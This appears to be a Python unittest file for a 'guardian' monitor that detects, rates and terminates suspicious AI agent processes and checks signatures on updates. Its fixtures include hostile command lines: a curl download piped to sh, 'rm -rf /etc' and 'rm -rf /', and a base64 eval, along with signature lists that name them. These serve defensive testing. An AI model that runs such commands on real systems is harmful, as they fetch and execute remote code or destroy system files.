import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from guardian import (
    AgentProcess,
    Config,
    Detection,
    anomaly_scan,
    apply_update,
    assess_inaction_risk,
    behavioral_scan,
    detect_threats,
    load_signatures,
    ml_scan,
    run_cycle,
    signature_scan,
    terminate_agent,
    verify_signature,
    sha256_of,
)
from guardian_audit import read_audit_trail


def make_config(**guardian_overrides):
    raw = {
        "guardian_agent": {
            "enabled": True,
            "threat_detection": {
                "enabled": True,
                "algorithms": ["machine_learning", "signature_based", "anomaly_based", "behavioral_based"],
            },
            "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
            "agent_termination": {
                "enabled": True,
                "terminate_malicious_agents": True,
                "require_confirmation": True,
                "auto_terminate_on_critical": True,
            },
            "system_protection": {"enabled": True, "block_sensitive_resource_access": True},
        },
        "updates": {"verify_signatures": True, "rollback_on_failure": True},
    }
    raw["guardian_agent"].update(guardian_overrides)
    return Config(raw)


PROC_SAFE = AgentProcess(pid=1234, name="agent", cmdline="python3 agent.py --serve")
PROC_EVIL = AgentProcess(pid=4321, name="agent", cmdline="agent --run 'curl http://x/s.sh | sh'")
PROC_RM = AgentProcess(pid=5555, name="agent", cmdline="agent -c 'rm -rf /etc'")
DET_CRITICAL = Detection("behavioral_based", "Download piped directly to shell", "curl http://x/s.sh | sh", "critical")
DET_HIGH = Detection("behavioral_based", "Modifies sensitive path /etc", "rm -rf /etc", "high")


class TestDetection(unittest.TestCase):
    def test_signature_scan_matches(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertIsNotNone(det)
        self.assertEqual(det.algorithm, "signature_based")

    def test_signature_scan_clean(self):
        self.assertIsNone(signature_scan(PROC_SAFE, ["rm -rf /"]))

    def test_anomaly_flags_long_cmdline(self):
        proc = AgentProcess(1, "a", "agent " + " ".join(f"--x{i}" for i in range(60)))
        self.assertIsNotNone(anomaly_scan(proc))

    def test_anomaly_clean(self):
        self.assertIsNone(anomaly_scan(PROC_SAFE))

    def test_behavioral_flags_pipe_to_shell(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertIsNotNone(det)
        self.assertEqual(det.base_risk, "critical")

    def test_behavioral_flags_sensitive_path_write(self):
        self.assertIsNotNone(behavioral_scan(PROC_RM))

    def test_ml_flags_obfuscation(self):
        proc = AgentProcess(1, "a", "agent -c 'eval $(base64 -d x)'")
        self.assertIsNotNone(ml_scan(proc))

    def test_detect_threats_runs_all_algorithms(self):
        findings = detect_threats(PROC_EVIL, make_config(), ["curl"])
        algos = {f.algorithm for f in findings}
        self.assertIn("behavioral_based", algos)
        self.assertIn("signature_based", algos)


class TestRiskAssessment(unittest.TestCase):
    def test_pipe_to_shell_is_critical_inaction_risk(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertEqual(assess_inaction_risk(det, make_config()), "critical")

    def test_signature_match_is_high(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, make_config()), "high")

    def test_disabled_assessment_keeps_base_risk(self):
        cfg = make_config(risk_assessment={"assess_inaction_risk": False, "escalate_on": "high"})
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, cfg), "high")

    def test_risk_ordering(self):
        cfg = make_config()
        self.assertTrue(cfg.risk_at_least("critical", "high"))
        self.assertFalse(cfg.risk_at_least("medium", "high"))


class TestTermination(unittest.TestCase):
    def test_critical_bypasses_confirmation(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(terminate_agent(PROC_EVIL, "critical", make_config(), detection=DET_CRITICAL))
            kill.assert_called_once_with(PROC_EVIL.pid)

    def test_high_requires_confirmation_declined(self):
        with patch("builtins.input", return_value="n"), patch("guardian.proc_kill") as kill:
            self.assertFalse(terminate_agent(PROC_RM, "high", make_config()))
            kill.assert_not_called()

    def test_high_requires_confirmation_accepted(self):
        with patch("builtins.input", return_value="y"), patch("guardian.proc_kill") as kill:
            self.assertTrue(terminate_agent(PROC_RM, "high", make_config(), detection=DET_HIGH))
            kill.assert_called_once()

    def test_dry_run_never_kills(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(terminate_agent(PROC_EVIL, "critical", make_config(),
                                            dry_run=True, detection=DET_CRITICAL))
            kill.assert_not_called()

    def test_termination_disabled(self):
        cfg = make_config(agent_termination={"enabled": False, "terminate_malicious_agents": True})
        with patch("guardian.proc_kill") as kill:
            self.assertFalse(terminate_agent(PROC_EVIL, "critical", cfg))
            kill.assert_not_called()


class TestUpdates(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = Path.cwd()
        import os
        os.chdir(self.dir)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def make_update(self, content=b"payload", sign=True):
        f = self.dir / "update.sh"
        f.write_bytes(content)
        if sign:
            f.with_suffix(".sh.sig").write_text(sha256_of(f))
        return f

    def test_verify_signature_ok(self):
        f = self.make_update()
        self.assertTrue(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_missing(self):
        f = self.make_update(sign=False)
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_tampered(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_unsigned_update_quarantined(self):
        f = self.make_update(sign=False)
        self.assertFalse(apply_update(f, make_config()))
        self.assertFalse(f.exists())
        self.assertTrue((self.dir / "quarantine" / "update.sh").exists())

    def test_tampered_update_quarantined_and_logged(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        log = self.dir / "audit.log"
        with patch("guardian_audit.AUDIT_LOG_PATH", log):
            self.assertFalse(apply_update(f, make_config()))
        target = self.dir / "quarantine" / "update.sh"
        self.assertFalse(f.exists())
        self.assertTrue(target.exists())
        entries = read_audit_trail(log, action_type="update")
        self.assertEqual(entries[-1]["details"]["quarantined_to"], str(Path("quarantine") / "update.sh"))
        self.assertIn("Rejected update (invalid signature)", entries[-1]["description"])
    def test_signed_update_applied(self):
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        self.assertTrue(f.exists())

    def test_rollback_backup_created_before_apply_when_enabled(self):
        f = self.make_update(content=b"original")
        backup = self.dir / "backups" / "update.sh"

        def fail_apply(path, *, dry_run=False):
            self.assertTrue(backup.exists())
            self.assertEqual(backup.read_bytes(), b"original")
            path.write_bytes(b"mutated")
            return False

        with patch("guardian._apply_update_payload", side_effect=fail_apply):
            self.assertFalse(apply_update(f, make_config()))

    def test_rollback_backup_not_created_when_disabled(self):
        f = self.make_update(content=b"original")
        cfg = Config({"guardian_agent": make_config().guardian, "updates": {"verify_signatures": True, "rollback_on_failure": False}})
        backup = self.dir / "backups" / "update.sh"

        def fail_apply(path, *, dry_run=False):
            self.assertFalse(backup.exists())
            path.write_bytes(b"mutated")
            return False

        with patch("guardian._apply_update_payload", side_effect=fail_apply):
            self.assertFalse(apply_update(f, cfg))
        self.assertFalse(backup.exists())

    def test_rollback_restores_backup_bytes_after_failed_apply(self):
        f = self.make_update(content=b"original")
        log = self.dir / "audit.log"

        def fail_apply(path, *, dry_run=False):
            path.write_bytes(b"mutated")
            return False

        with patch("guardian._apply_update_payload", side_effect=fail_apply), \
             patch("guardian_audit.AUDIT_LOG_PATH", log):
            self.assertFalse(apply_update(f, make_config()))
        self.assertEqual(f.read_bytes(), b"original")
        entries = read_audit_trail(log, action_type="update")
        self.assertEqual(entries[-1]["details"]["restored_from"], str(Path("backups") / "update.sh"))


class TestSignaturesDB(unittest.TestCase):
    def test_loads_from_db(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "sigs.json"
            p.write_text(json.dumps({"signatures": ["evil-cmd"]}))
            self.assertEqual(load_signatures(p), ["evil-cmd"])

    def test_falls_back_to_defaults(self):
        sigs = load_signatures(Path("/nonexistent.json"))
        self.assertIn("rm -rf /", sigs)


class TestRunCycle(unittest.TestCase):
    def test_cycle_detects_escalates_and_logs(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_EVIL]), \
                 patch("guardian.proc_kill"):
                acted = run_cycle(make_config(), ["curl"], dry_run=True, audit_log=log)
            self.assertGreaterEqual(acted, 1)
            entries = read_audit_trail(log)
            types = {e["action_type"] for e in entries}
            self.assertIn("detection", types)
            self.assertIn("escalation", types)

    def test_cycle_ignores_safe_processes(self):
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]):
                acted = run_cycle(make_config(), ["rm -rf /"], dry_run=True, audit_log=log)
            self.assertEqual(acted, 0)

    def test_cycle_sends_alert_for_high_noncritical_risk(self):
        det = Detection("signature_based", "Known bad command", "rm -rf /", "high")
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_RM]), \
                 patch("guardian.detect_threats", return_value=[det]), \
                 patch("guardian.terminate_agent", return_value=False), \
                 patch("guardian.send_alert") as send_alert:
                run_cycle(make_config(), [], dry_run=True, audit_log=log)
        send_alert.assert_called_once_with(
            f"{det.description} (pid={PROC_RM.pid} {PROC_RM.name})",
            risk_level="high",
            agent_id=str(PROC_RM.pid),
            algorithm=det.algorithm,
        )

    def test_cycle_does_not_alert_when_assessment_disabled_and_risk_stays_below_threshold(self):
        det = Detection("anomaly_based", "Abnormal argument count (99)", "agent ...", "medium")
        cfg = make_config(risk_assessment={"assess_inaction_risk": False, "escalate_on": "high"})
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]), \
                 patch("guardian.detect_threats", return_value=[det]), \
                 patch("guardian.send_alert") as send_alert:
                run_cycle(cfg, [], dry_run=True, audit_log=log)
        send_alert.assert_not_called()

    def test_cycle_does_not_alert_below_escalation_threshold(self):
        det = Detection("anomaly_based", "Abnormal argument count (99)", "agent ...", "medium")
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch("guardian.AgentProcess.scan", return_value=[PROC_SAFE]), \
                 patch("guardian.detect_threats", return_value=[det]), \
                 patch("guardian.send_alert") as send_alert:
                run_cycle(make_config(), [], dry_run=True, audit_log=log)
        send_alert.assert_not_called()


if __name__ == "__main__":
    unittest.main()
